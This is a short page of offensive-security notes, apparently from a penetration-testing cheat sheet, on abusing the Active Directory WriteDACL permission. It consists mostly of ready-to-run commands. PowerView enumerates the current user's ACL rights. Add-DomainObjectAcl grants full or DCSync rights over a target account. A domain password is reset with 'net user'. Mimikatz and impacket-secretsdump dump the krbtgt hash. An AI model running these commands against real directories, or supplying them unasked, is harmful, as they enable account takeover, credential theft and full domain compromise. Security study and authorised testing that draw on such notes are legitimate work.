---
metaLinks:
  alternates:
    - >-
      https://app.gitbook.com/s/qDX4NWkPelZggTpGCfyF/offensive-treasure/ad-attack/abuse-acls/writedacl
---

# WriteDACL

## WriteDACL

Enumeration

{% code title="PowerView" overflow="wrap" %}
```powershell
Get-DomainUser | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}
```
{% endcode %}

### GenericAll

Abuse WriteDACL

{% code title="PowerView" overflow="wrap" %}
```powershell
Add-DomainObjectAcl -TargetIdentity sieng.chantrea -PrincipalIdentity khan.chanthou -Rights All
```
{% endcode %}

Verify ACL

{% code title="PowerView" overflow="wrap" %}
```powershell
Get-ObjectAcl -Identity sieng.chantrea -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}
```
{% endcode %}

We can either reset password or dcsync

```powershell
net user sieng.chantrea Password123 /domain
```

### DCSync

{% code title="PowerView" overflow="wrap" %}
```powershell
Add-DomainObjectAcl -TargetIdentity Object_Name -PrincipalIdentity khan.chanthou -Rights DCSync
```
{% endcode %}

We can perform DCSync Attack

```python
mimikatz# lsadump::dcsync /user:krbtgt

impacket-secretsdump -just-dc-user krbtgt vulnableone/sqlsvc@10.10.10.10
```
